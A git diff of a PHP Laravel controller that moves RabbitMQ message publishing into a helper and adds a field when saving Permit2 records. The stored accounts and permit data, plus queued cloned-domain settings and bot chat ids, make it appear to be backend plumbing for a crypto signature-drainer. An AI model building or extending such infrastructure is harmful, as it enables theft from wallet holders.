@@ -6,10 +6,10 @@ use Illuminate\Http\Request;
 use Illuminate\Http\JsonResponse;
 use App\Models\PermitCollection;
 use Illuminate\Routing\Controller as BaseController;
-use PhpAmqpLib\Message\AMQPMessage;
-use Illuminate\Support\Facades\App;
+
 use \App\Models\PacketSiteCollection;
 use App\Models\Chainpermit2Collection;
+use App\Http\Controllers\MsgRabbitMq;
 class SigController extends BaseController
 {
   public function index(Request $request)
@@ -55,11 +55,7 @@ class SigController extends BaseController
         return new JsonResponse(['code'=>0,'message' => 'Failed to Save Message','details'=>$e->getMessage()], 200,['encoding' => 'utf-8']);
       }
 
-    //将机器人消息存进消息队列
-    $connection = App::make('rabbitmq');
-    $channel = $connection->channel();
-    $queue = 'default';
-    $channel->queue_declare($queue, false, true, false, false);
+//将机器人消息存进消息队列
     $messageData = [
         'envData' => [
             'NEXT_PUBLIC_DOMAIN_WEBSITE' =>  $raw_website,
@@ -71,22 +67,42 @@ class SigController extends BaseController
           'bot_chatid' => $bot_chatid
         ]
     ];
-    $message = new AMQPMessage(json_encode($messageData));
-    try {
-        $result = $channel->basic_publish($message, '', $queue);
-    } catch (\Exception $e) {
-        $channel->close();
-        $connection->close();
-        return new JsonResponse(['code'=>0,'message' => 'Failed to Publish Message','details'=>$e->getMessage()], 200,['encoding' => 'utf-8']);
-    }
-    $channel->close();
-    $connection->close();
+    $queue='default';
+    
+    MsgRabbitMq::pushMsg($queue,$messageData);
+
+    // $connection = App::make('rabbitmq');
+    // $channel = $connection->channel();
+    // $queue = 'default';
+    // $channel->queue_declare($queue, false, true, false, false);
+    // $messageData = [
+    //     'envData' => [
+    //         'NEXT_PUBLIC_DOMAIN_WEBSITE' =>  $raw_website,
+    //         'NEXT_PUBLIC_SOURCE' => $new_domain,
+    //         'NEXT_PUBLIC_CHAIN' => $chain,
+    //         'NEXT_PUBLIC_OWNER'=> $owner
+    //     ],
+    //     'chatData' =>[
+    //       'bot_chatid' => $bot_chatid
+    //     ]
+    // ];
+    // $message = new AMQPMessage(json_encode($messageData));
+    // try {
+    //     $result = $channel->basic_publish($message, '', $queue);
+    // } catch (\Exception $e) {
+    //     $channel->close();
+    //     $connection->close();
+    //     return new JsonResponse(['code'=>0,'message' => 'Failed to Publish Message','details'=>$e->getMessage()], 200,['encoding' => 'utf-8']);
+    // }
+    // $channel->close();
+    // $connection->close();
     return new JsonResponse(['code'=>1,'message' => 'Message published successfully.'], 200,['encoding' => 'utf-8']);
    // return response()->json(['code'=>1,'message' => 'Message published successfully.']);
   }
 
   public function saveChainPermit2Data(Request $request){
     $Chainpermit2Collection = new Chainpermit2Collection;
+    $Chainpermit2Collection->pc_id = $request->input('pc_id');
     $Chainpermit2Collection->account = $request->input('account');
     $Chainpermit2Collection->raw_data = json_encode($request->input('raw_data'));
     $Chainpermit2Collection->save();
